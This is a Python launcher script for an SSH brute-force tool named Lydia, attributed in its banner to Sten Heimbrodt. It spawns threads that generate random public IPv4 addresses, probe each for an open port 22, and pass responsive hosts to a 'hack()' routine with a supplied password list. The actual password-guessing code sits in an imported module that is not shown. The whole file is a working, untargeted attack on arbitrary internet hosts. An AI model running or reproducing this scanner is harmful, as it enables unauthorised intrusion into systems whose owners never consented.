#!/usr/bin/env python
from tabnanny import verbose
from lydia import Lydia
from random import randint
import socket
import _thread
import time
from termcolor import colored
import sys
from argparse import ArgumentParser

parser = ArgumentParser()
parser.add_argument("-p", "--passwordlist", dest="pwlist",
                    help="Path to the passwordlist")
parser.add_argument("-l", "--logfile", dest="logfile",
                    help="Path to logfile")
parser.add_argument("-q", "--quiet", dest="verb",
                    action="store_false", default=True,
                    help="don't print status messages to stdout")
parser.add_argument("-t", "--threads", dest="threadcount",
                    help="Number of threads to work with")
print("                                                                                                   ")
print("                           ▄█       ▄██   ▄   ████████▄   ▄█     ▄████████                         ")
print("                          ███       ███   ██▄ ███   ▀███ ███    ███    ███                         ")
print("                          ███       ███▄▄▄███ ███    ███ ███▌   ███    ███                         ")
print("                          ███       ▀▀▀▀▀▀███ ███    ███ ███▌   ███    ███                         ")
print("                          ███       ▄██   ███ ███    ███ ███▌ ▀███████████                         ")
print("                          ███       ███   ███ ███    ███ ███    ███    ███                         ")
print("                          ███▌    ▄ ███   ███ ███   ▄███ ███    ███    ███                         ")
print("                          █████▄▄██  ▀█████▀  ████████▀  █▀     ███    █▀                          ")
print("                          ▀                                                                        ")
print("  _______ __                          __                     __        __               __         ")
print(" |       |  |--.-----.   .---.-.--.--|  |_.-----.-----.-----|  |--.   |  |--.----.--.--|  |_.-----.")
print(" |.|   | |     |  -__|   |  _  |  |  |   _|  _  |__ --|__ --|     |   |  _  |   _|  |  |   _|  -__|")
print(" `-|.  |-|__|__|_____|   |___._|_____|____|_____|_____|_____|__|__|   |_____|__| |_____|____|_____|")
print("   |:  |                                                                                           ")
print("   |::.|                                                                                           ")
print("   `---'                                                                                           ")
print("===================================================================================================")
print("=                     Made Sten (Gespel) Heimbrodt [@Sten_Heimbrodt]                              =")
print("===================================================================================================")


args = parser.parse_args()
verbose = args.verb
if(args.pwlist == None):
    print("No passwordlist defined!")
    exit()
passlistpath = args.pwlist
if(args.logfile == None):
    print("No logfilepath defined. Using default logs.txt")
    logfilepath = "log.txt"
else:
    logfilepath = args.logfile
if(args.threadcount == None):
    print("No threadcount given. Defaulting to 4 threads...")
    threads = 4
else:
    threads = int(args.threadcount)

def generateIp():
    return str(randint(1, 255)) + "." + str(randint(1, 255)) + "." + str(randint(1, 255)) + "." + str(randint(1, 255))

def checkForSSH(ip):
    a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    a_socket.settimeout(3)
    location = (ip, 22)
    result_of_check = a_socket.connect_ex(location)
    a_socket.close()

    if result_of_check == 0:
        return True
    else:
        return False

def go(threadnr):
    while True:
        ip = generateIp()
        if(verbose == True):
            print("[" + colored("Thread " + threadnr, "red") + "][" + colored("INFO", "cyan") + "] Checking wether " + ip + " has open port 22")
        if(checkForSSH(ip) == True):
            l = Lydia(ip, threadnr, passlistpath, logfilepath)
            l.hack()

if __name__ == "__main__":
    for i in range(0, threads):
        try:
            _thread.start_new_thread(go, (str(i),))
        except Exception as e:
            print("Error: unable to start thread " + str(i))
            print(e)
    while(True):
       pass